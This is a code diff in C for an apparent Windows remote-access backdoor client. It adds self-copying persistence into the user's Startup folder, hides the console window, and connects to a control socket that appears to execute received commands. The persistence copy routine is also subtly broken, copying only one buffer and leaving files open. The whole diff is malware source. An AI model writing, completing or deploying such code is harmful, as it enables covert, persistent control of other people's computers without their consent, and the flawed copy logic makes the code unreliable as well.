@@ -48,6 +48,44 @@ int wsa_soc_con( char* IP, int port )
     return 0;
 }
 
+
+int check_path( char* path ){
+    WIN32_FIND_DATA fdfile;
+    HANDLE hfind = NULL;
+
+    char newpath[2049];
+    sprintf(newpath, "%s\\*.*", path);
+
+    if ( (hfind = FindFirstFile(newpath, &fdfile)) == INVALID_HANDLE_VALUE ){
+        return 1;
+    }
+
+    FindClose(hfind);
+    
+    return 0;
+}
+
+
+int to_startup( char* path, char* filename, char* out_name ) {
+    FILE* fptr;
+    FILE* fptw;
+
+    char buffer[BUFF_LEN];
+    if ( (fptr = fopen(filename, "rb")) == 0 ) {
+        return 1;
+    }
+
+    if ( (fptw = fopen(out_name, "wb")) == 0 ) {
+        return 1;
+    }
+
+    fread(buffer, sizeof(buffer), 1, fptr);
+    fwrite(buffer, sizeof(buffer), 1, fptw);
+
+    return 0;
+}
+
+
 int is_file_exist( char* name ) {
     FILE* fptr;
 
@@ -311,7 +349,7 @@ void ClientSoc( char* IP , int port ) {
                 send(sock, "[*]Executed", sizeof("[*]Executed"), 0);
                 
             }
-            else if ( buffrecv == "exit_client\n" ) {
+            else if ( strcmp(buffrecv, "exit_client\n") == 0 ) {
                 exit(1);
             }
             else
@@ -323,7 +361,45 @@ void ClientSoc( char* IP , int port ) {
 }
 
 
-int main(){
+int main( int argc, char* argv[] ) {
+    char exe_path[900];
+    char temp_name[300];
+    char current_exe[300];
+    char path_name[900];
+    char* path = getenv("USERPROFILE");
+    int count = 0;
+    int i;
+
+    sprintf(path_name, "%s%s",  path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
+    
+
+    if ( check_path(path_name) == 0 ) {
+        memset(current_exe, 0, sizeof(current_exe));
+        memset(temp_name, 0, sizeof(temp_name));
+        memset(exe_path, 0, sizeof(exe_path));
+        memset(path_name, 0, sizeof(path_name));
+        
+        for ( i = strlen(argv[0]) - 1; i != 0; i-- ) {
+            if (argv[0][i] == '\\') {
+                break;
+            }
+            temp_name[count] = argv[0][i];
+            count++;
+        }
+        count = 0;
+        
+        for ( i = strlen(temp_name) - 1; i != -1; i-- ) {
+            current_exe[count] = temp_name[i]; 
+            count++;
+        }
+        
+        sprintf(path_name, "%s%s%s",  path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", current_exe);
+        
+        if (is_file_exist(path_name) != 0) {
+            to_startup(path, argv[0], path_name);
+        }
+    }
+
     FreeConsole();
     ClientSoc("127.0.0.1", 9999);
     return 0;
